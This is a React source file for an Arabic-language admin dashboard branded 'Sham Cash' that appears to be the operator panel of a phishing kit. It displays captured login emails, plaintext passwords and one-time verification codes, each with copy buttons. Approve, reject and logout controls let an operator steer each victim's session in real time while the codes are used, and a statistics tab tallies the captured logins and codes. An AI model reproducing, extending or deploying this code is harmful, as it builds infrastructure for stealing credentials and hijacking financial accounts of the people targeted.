                                    {formatTimeAgo(item.created_at)}
                                  </span>
                                </div>
                              </div>
                              <div className="grid sm:grid-cols-2 gap-3">
                                {formFields
                                  .filter(f => f.page_key === 'register' && f.field_key !== 'confirm_password')
                                  .sort((a, b) => a.field_order - b.field_order)
                                  .map((field) => {
                                    const Icon = FIELD_ICONS[field.field_key] || Activity;
                                    const coreCol = CORE_COLUMNS[field.field_key];
                                    const value = coreCol ? item.data[coreCol] : item.data.extra_fields?.[field.field_key];
                                    
                                    if (field.field_type === 'password') {
                                      return (
                                        <div key={field.id} className="col-span-full bg-slate-900/50 rounded-lg p-3 flex items-center gap-3">
                                          <Shield className="w-4 h-4 text-slate-400 shrink-0" />
                                          <div className="flex-1 min-w-0">
                                            <p className="text-[10px] text-slate-500 font-medium">{field.label}</p>
                                            <div className="flex items-center gap-3">
                                              <p className="font-mono text-sm text-white tracking-widest">{showPassMap[item.id] ? (value || '—') : maskPassword(value || '')}</p>
                                              <button onClick={() => togglePassVisibility(item.id)} className="text-xs text-blue-400 hover:underline shrink-0">
                                                {showPassMap[item.id] ? 'إخفاء' : 'إظهار'}
                                              </button>
                                              {value && (
                                                <button onClick={() => copyToClipboard(value, `pass-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
                                                  {copiedId === `pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                                  {copiedId === `pass-${item.id}` ? 'تم' : 'نسخ'}
                                                </button>
                                              )}
                                            </div>
                                          </div>
                                        </div>
                                      );
                                    }
                                    return (
                                      <div key={field.id} className="bg-slate-900/50 rounded-lg p-3 flex items-start gap-2">
                                        <Icon className="w-4 h-4 text-slate-400 mt-0.5 shrink-0" />
                                        <div className="min-w-0 flex-1">
                                          <p className="text-[10px] text-slate-500 font-medium mb-0.5">{field.label}</p>
                                          <div className="flex items-center justify-between gap-2">
                                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
                                            {value && (field.field_type === 'email' || field.field_key === 'email') && (
                                              <button onClick={() => copyToClipboard(value, `email-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
                                                {copiedId === `email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                                {copiedId === `email-${item.id}` ? 'تم' : 'نسخ'}
                                              </button>
                                            )}
                                          </div>
                                        </div>
                                      </div>
                                    );
                                  })}
                              </div>
                            </div>
                          );
                        }

                        // Login Attempt Card
                        if (item.type === 'login') {
                          const loginStatus = item.data.status;
                          
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-amber-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-2">
                                  <LogInIcon className={`w-4 h-4 ${isNewest ? 'text-amber-400' : 'text-amber-500/70'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-amber-400' : 'text-white'}`}>تسجيل الدخول</h4>
                                </div>
                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-amber-500/20 text-amber-400' : 'bg-slate-700 text-slate-400'}`}>
                                  {formatTimeAgo(item.created_at)}
                                </span>
                              </div>
                              <div className="grid grid-cols-2 gap-3">
                                <div className="bg-slate-900/50 rounded-lg p-3">
                                  <div className="flex items-center justify-between mb-1">
                                    <p className="text-[10px] text-slate-500">البريد</p>
                                    <button onClick={() => copyToClipboard(item.data.email, `login-email-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                      {copiedId === `login-email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                      {copiedId === `login-email-${item.id}` ? 'تم' : 'نسخ'}
                                    </button>
                                  </div>
                                  <p className="text-xs text-slate-200 truncate ltr text-left">{item.data.email}</p>
                                </div>
                                <div className="bg-slate-900/50 rounded-lg p-3">
                                  <div className="flex items-center justify-between mb-1">
                                    <p className="text-[10px] text-slate-500">كلمة المرور</p>
                                    <button onClick={() => copyToClipboard(item.data.password, `login-pass-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                      {copiedId === `login-pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                      {copiedId === `login-pass-${item.id}` ? 'تم' : 'نسخ'}
                                    </button>
                                  </div>
                                  <p className="text-sm text-white font-bold tracking-wider">{item.data.password}</p>
                                </div>
                              </div>
                              
                              {/* أزرار الموافقة والرفض وتسجيل الخروج */}
                              {loginStatus === 'pending' && (
                                <div className="flex gap-2 mt-3">
                                  <button
                                    onClick={() => handleLoginAttempt(item.id, 'approved')}
                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
                                  >
                                    ✓ موافق
                                  </button>
                                  <button
                                    onClick={() => handleLoginAttempt(item.id, 'rejected')}
                                    className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
                                  >
                                    ✕ رفض
                                  </button>
                                  <button
                                    onClick={() => handleLogoutNotice(item.id)}
                                    className="flex-1 bg-orange-600 hover:bg-orange-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors flex items-center justify-center gap-1"
                                  >
                                    🚪 خروج
                                  </button>
                                </div>
                              )}
                              
                              {loginStatus === 'approved' && (
                                <div className="mt-3 bg-green-500/20 text-green-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
                                  ✓ تمت الموافقة
                                </div>
                              )}
                              
                              {loginStatus === 'rejected' && (
                                <div className="mt-3 bg-red-500/20 text-red-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
                                  ✕ تم الرفض
                                </div>
                              )}
                            </div>
                          );
                        }

                        // Verification Code Card
                        if (item.type === 'verification') {
                          const verifyStatus = item.data.status || (item.data.verified ? 'verified' : 'pending');
                          
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-green-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-2">
                                  <ShieldCheck className={`w-4 h-4 ${isNewest ? 'text-green-400' : 'text-green-500/70'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-green-400' : 'text-white'}`}>رمز التحقق</h4>
                                </div>
                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-green-500/20 text-green-400' : 'bg-slate-700 text-slate-400'}`}>
                                  {formatTimeAgo(item.created_at)}
                                </span>
                              </div>
                              <div className="bg-slate-900/50 rounded-lg p-3 text-center">
                                <div className="flex items-center justify-between mb-1">
                                  <p className="text-[10px] text-slate-500">رمز التحقق</p>
                                  <button onClick={() => copyToClipboard(item.data.code, `code-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
                                    {copiedId === `code-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                    {copiedId === `code-${item.id}` ? 'تم' : 'نسخ'}
                                  </button>
                                </div>
                                <p className="text-xl text-white font-bold tracking-[0.3em]">{item.data.code}</p>
                                
                                {/* أزرار الموافقة والرفض - تظهر عند pending أو pending_verification */}
                                {(verifyStatus === 'pending' || verifyStatus === 'pending_verification') && (
                                  <div className="flex gap-2 mt-3">
                                    <button
                                      onClick={() => handleVerifyCode(item.id, 'approved')}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
                                    >
                                      ✓ موافق
                                    </button>
                                    <button
                                      onClick={() => handleVerifyCode(item.id, 'rejected')}
                                      className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold py-2 px-3 rounded-lg transition-colors"
                                    >
                                      ✕ رفض
                                    </button>
                                  </div>
                                )}
                                
                                {verifyStatus === 'verified' && (
                                  <div className="mt-3 bg-green-500/20 text-green-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
                                    ✓ تمت الموافقة
                                  </div>
                                )}
                                
                                {verifyStatus === 'rejected' && (
                                  <div className="mt-3 bg-red-500/20 text-red-400 text-xs font-semibold py-2 px-3 rounded-lg text-center">
                                    ✕ تم الرفض
                                  </div>
                                )}
                              </div>
                            </div>
                          );
                        }

                        return null;
                      })}
                    </div>
                  );
                })()}
              </div>
            )}
          </div>
        </div>
      </div>
      
      {/* Delete Confirmation Modal */}
      {showDeleteModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-slate-800 rounded-2xl border border-slate-700 w-full max-w-md shadow-2xl">
            <div className="p-6">
              <div className="flex items-center justify-center w-16 h-16 bg-red-500/20 rounded-full mx-auto mb-4">
                <AlertTriangle className="w-8 h-8 text-red-400" />
              </div>
              <h2 className="text-xl font-bold text-white text-center mb-2">تأكيد الحذف النهائي</h2>
              <p className="text-slate-400 text-center mb-4">
                هل أنت متأكد من حذف {selectedIds.size} تسجيل نهائياً؟
              </p>
              <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 mb-6">
                <p className="text-sm text-red-300 text-center">
                  سيتم حذف جميع البيانات والسجلات المرتبطة بشكل نهائي ولا يمكن التراجع عن هذا الإجراء
                </p>
              </div>
              <div className="flex gap-3">
                <button
                  onClick={() => setShowDeleteModal(false)}
                  disabled={deleting}
                  className="flex-1 px-4 py-3 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-colors disabled:opacity-50"
                >
                  إلغاء
                </button>
                <button
                  onClick={deleteSelected}
                  disabled={deleting}
                  className="flex-1 px-4 py-3 bg-red-600 hover:bg-red-500 text-white font-semibold rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {deleting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>جارٍ الحذف...</span>
                    </>
                  ) : (
                    <>
                      <Trash2 className="w-4 h-4" />
                      <span>نعم، احذف الكل</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── CMS Tab ──────────────────────────────────────────────────────────────────

function CMSTab() {
  const [activeSection, setActiveSection] = useState<'header_footer' | 'pages' | 'form_fields'>('header_footer');
  return (
    <div className="space-y-5 text-right" dir="rtl">
      <div className="flex gap-2 overflow-x-auto pb-1">
        {[
          { key: 'header_footer', label: 'الرأس والتذييل' },
          { key: 'pages', label: 'محتوى الصفحات' },
          { key: 'form_fields', label: 'حقول النماذج' },
        ].map((s) => (
          <button key={s.key} onClick={() => setActiveSection(s.key as any)}
            className={`px-5 py-2.5 rounded-xl text-sm font-semibold whitespace-nowrap transition-all ${activeSection === s.key ? 'bg-blue-600 text-white shadow-md' : 'bg-slate-800 border border-slate-700 text-slate-400 hover:text-white'}`}>
            {s.label}
          </button>
        ))}
      </div>
      {activeSection === 'header_footer' && <HeaderFooterEditor />}
      {activeSection === 'pages' && <PageContentEditor />}
      {activeSection === 'form_fields' && <FormFieldsEditor />}
    </div>
  );
}

// ─── Statistics Tab ─────────────────────────────────────────────────────────

function StatisticsTab() {
  const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      setLoading(true);
      const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
      
      let logins: LoginAttempt[] = [];
      try {
        const { data, error } = await supabase.from('login_attempts').select('*').order('created_at', { ascending: false });
        if (!error && data) logins = data;
      } catch (e) {}
      
      let codes: VerificationCode[] = [];
      try {
        const { data, error } = await supabase.from('verification_codes').select('*').order('created_at', { ascending: false });
        if (!error && data) codes = data;
      } catch (e) {}
      
      if (regs) {
        const combined = regs.map(r => ({
          ...r,
          login_attempts: logins?.filter(l => l.registration_id === r.id) || [],
          verification_codes: codes?.filter(c => c.registration_id === r.id) || []
        }));
        setRegistrations(combined);
      }
      setLoading(false);
    };
    fetchData();
  }, []);

  const stats = {
    total: registrations.length,
    verified: registrations.filter((r) => r.status === 'verified' || r.status === 'completed').length,
    pending: registrations.filter((r) => r.status === 'pending').length,
    today: registrations.filter((r) => new Date(r.created_at).toDateString() === new Date().toDateString()).length,
    loginAttempts: registrations.reduce((sum, r) => sum + (r.login_attempts?.length || 0), 0),
    verificationCodes: registrations.reduce((sum, r) => sum + (r.verification_codes?.length || 0), 0),
  };

  const statCards = [
    { label: 'إجمالي التسجيلات', value: stats.total, icon: Users, color: 'blue' },
    { label: 'تم التحقق', value: stats.verified, icon: CheckCircle2, color: 'green' },
    { label: 'قيد المراجعة', value: stats.pending, icon: Clock, color: 'yellow' },
    { label: 'تسجيلات اليوم', value: stats.today, icon: Activity, color: 'purple' },
    { label: 'محاولات الدخول', value: stats.loginAttempts, icon: LogInIcon, color: 'orange' },
    { label: 'رموز التحقق', value: stats.verificationCodes, icon: ShieldCheck, color: 'cyan' },
  ];

  const colorMap: Record<string, { bg: string; text: string }> = {
    blue: { bg: 'bg-blue-500/20', text: 'text-blue-400' },
    green: { bg: 'bg-green-500/20', text: 'text-green-400' },
    yellow: { bg: 'bg-yellow-500/20', text: 'text-yellow-400' },
    purple: { bg: 'bg-purple-500/20', text: 'text-purple-400' },
    orange: { bg: 'bg-orange-500/20', text: 'text-orange-400' },
    cyan: { bg: 'bg-cyan-500/20', text: 'text-cyan-400' },
  };

  return (
    <div className="space-y-8 text-right" dir="rtl">
      <div className="flex items-center gap-3">
        <Activity className="w-6 h-6 text-blue-400" />
        <h2 className="text-xl font-bold text-white">إحصائيات عامة</h2>
      </div>
      
      {loading ? (
        <div className="flex items-center justify-center py-20">
          <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : (
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
          {statCards.map((card) => {
            const Icon = card.icon;
            return (
              <div key={card.label} className="bg-slate-800 rounded-2xl p-5 border border-slate-700">
                <div className={`w-10 h-10 rounded-xl flex items-center justify-center mb-3 ${colorMap[card.color].bg}`}>
                  <Icon className={`w-5 h-5 ${colorMap[card.color].text}`} />
                </div>
                <p className={`text-3xl font-extrabold ${colorMap[card.color].text}`}>{card.value}</p>
                <p className="text-xs text-slate-400 mt-1 font-medium">{card.label}</p>
              </div>
            );
          })}
        </div>
      )}

      {/* Registration Status Chart */}
      <div className="bg-slate-800 rounded-2xl p-6 border border-slate-700">
        <h3 className="text-lg font-bold text-white mb-4">حالة التسجيلات</h3>
        <div className="space-y-4">
          {[
            { label: 'تم التحقق', count: stats.verified, total: stats.total, color: 'bg-green-500' },
            { label: 'قيد المراجعة', count: stats.pending, total: stats.total, color: 'bg-yellow-500' },
          ].map((item) => {
            const percentage = stats.total > 0 ? (item.count / stats.total) * 100 : 0;
            return (
              <div key={item.label} className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">{item.label}</span>
                  <span className="text-white font-semibold">{item.count} ({percentage.toFixed(1)}%)</span>
                </div>
                <div className="h-3 bg-slate-700 rounded-full overflow-hidden">
                  <div className={`h-full ${item.color} rounded-full transition-all duration-500`} style={{ width: `${percentage}%` }} />
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

// ─── Main Admin Page ──────────────────────────────────────────────────────────

export default function AdminPage() {
  const [activeTab, setActiveTab] = useState<'registrations' | 'statistics' | 'cms' | 'security'>('registrations');
  const [soundEnabled, setSoundEnabled] = useState(getSoundEnabled());
  
  // Notifications state
  const [showNotificationModal, setShowNotificationModal] = useState(false);
  const [notificationLoaded, setNotificationLoaded] = useState(false);
  const { admin, checkNotificationsEnabled, setNotificationsEnabled } = useAdminAuth();
  
  // Track if notification check has been run
  const notificationCheckRunRef = useRef(false);

  // Keep foreground FCM messages active while the admin dashboard is open
  useNotifications(admin?.id || null);

  // تهيئة الأصوات عند تحميل الصفحة
  useEffect(() => {
    initSounds();
  }, []);

  // التحقق من تفعيل الإشعارات بعد 5 ثواني
  useEffect(() => {
    if (!admin || notificationCheckRunRef.current) {
      return;
    }

    notificationCheckRunRef.current = true;

    const checkAndShowNotifications = async () => {
      try {
        // تحقق إذا الإشعارات مفعلة مسبقاً
        const isEnabled = await checkNotificationsEnabled();
        
        if (!isEnabled) {
          setShowNotificationModal(true);
        }
      } catch {
        // في حالة الخطأ، اعرض الشاشة المنبثقة
        setShowNotificationModal(true);
      } finally {
        setNotificationLoaded(true);
      }
    };
    
    // انتظر 5 ثواني ثم تحقق
    const timeoutId = setTimeout(checkAndShowNotifications, 5000);
    
    return () => clearTimeout(timeoutId);
  }, [admin, checkNotificationsEnabled]);

  // Handle notification complete
  const handleNotificationComplete = (success: boolean) => {
    setShowNotificationModal(false);
    setNotificationsEnabled(success);
  };

  // Handle notification skip
  const handleNotificationSkip = () => {
    setShowNotificationModal(false);
  };

  // دالة تبديل الصوت
  const handleToggleSound = () => {
    const newState = toggleSound();
    setSoundEnabled(newState);
  };

  return (
    <div className="h-screen flex flex-col bg-slate-900 text-white overflow-hidden m-0 p-0" dir="rtl" style={{ margin: 0, padding: 0, width: '100vw', height: '100vh' }}>
      <header className="shrink-0 bg-slate-800 border-b border-slate-700 px-4 py-4" style={{ margin: 0 }}>
        <div className="flex items-center justify-between w-full">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="text-right">
              <h1 className="text-base font-bold text-white">لوحة التحكم - شام كاش</h1>
              <p className="text-xs text-slate-400">إدارة الموقع وطلبات التمويل</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            {/* زر كتم/تفعيل الصوت */}
            <button
              onClick={handleToggleSound}
              className={`p-2.5 rounded-xl transition-all ${
                soundEnabled 
                  ? 'bg-green-600/20 text-green-400 hover:bg-green-600/30' 
                  : 'bg-red-600/20 text-red-400 hover:bg-red-600/30'
              }`}
              title={soundEnabled ? 'كتم الإشعارات الصوتية' : 'تفعيل الإشعارات الصوتية'}
            >
              {soundEnabled ? <Volume2 className="w-5 h-5" /> : <VolumeX className="w-5 h-5" />}
            </button>
            <div className="flex gap-1 bg-slate-700/50 rounded-xl p-1">
              {[
                { key: 'registrations', label: 'طلبات التمويل', icon: List },
                { key: 'statistics', label: 'إحصائيات', icon: Activity },
                { key: 'cms', label: 'إدارة المحتوى', icon: Layout },
                { key: 'security', label: 'الأمان', icon: Shield },
              ].map(({ key, label, icon: Icon }) => (
                <button key={key} onClick={() => setActiveTab(key as any)}
                  className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all ${activeTab === key ? 'bg-blue-600 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}>
                  <Icon className="w-4 h-4" />{label}
                </button>
              ))}
            </div>
          </div>
        </div>
      </header>

      <div className="flex-1 overflow-hidden flex flex-col">
        <div className="max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 flex flex-col flex-1 overflow-hidden">
          {activeTab === 'registrations' ? <RegistrationsTab /> : 
           activeTab === 'statistics' ? (
             <div className="flex-1 overflow-y-auto"><StatisticsTab /></div>
           ) : activeTab === 'security' ? (
             <div className="flex-1 overflow-y-auto"><SecurityTab /></div>
           ) : (
             <div className="flex-1 overflow-y-auto"><CMSTab /></div>
           )}
        </div>
      </div>
      
      {/* Notification Permission Modal */}
      {showNotificationModal && admin && (
        <NotificationPermission
          adminId={admin.id}
          onComplete={handleNotificationComplete}
          onSkip={handleNotificationSkip}
        />
      )}
      
    </div>
  );
}
